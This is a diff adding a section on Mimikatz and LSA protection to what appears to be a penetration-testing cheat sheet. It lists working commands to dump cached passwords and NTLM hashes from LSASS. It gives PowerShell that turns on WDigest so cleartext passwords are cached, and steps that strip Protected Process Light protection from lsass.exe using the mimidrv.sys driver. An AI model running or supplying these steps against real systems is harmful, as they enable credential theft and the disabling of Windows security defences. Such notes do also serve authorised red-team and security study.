@@ -98,3 +98,37 @@ ALSO AS 'NT AUTHORITY'
 
 <br><br>
 
+# MIMIKATZ and LSA Protection
+
+**Removal of LSA protection requires mimidrv.sys which may be flagged by AV**  
+
+#### dump all cached passwords and hashes from LSASS
+
+1) privilege::debug  
+2) sekurlsa::logonpasswords  
+3) Hashes listed under 'NTLM'  
+
+
+### Wdigest passwords are cleartext.  
+> The wdigest authentication protocol requires a clear text password, but it is disabled in Windows 8.1 and newer. We can enable it by creating the UseLogonCredential registry value in the path HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest. Once we set this value to "1", the clear text password will be cached in LSASS after subsequent logins.
+
+```Powershell
+Get-ItemPropertyValue -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential
+
+Set-ItemProperty -Path hklm:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Value 1
+```
+
+### LSA protection using Protected Processes Light
+
+Check if PPL is running with powershell
+
+```powershell
+(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa").RunAsPPL
+```
+
+**Disable PPL with mimikatz and mimidrv.sys**
+
+1) !+
+2) !processprotect /process:lsass.exe /remove
+3) sekurlsa::logonpasswords 
+
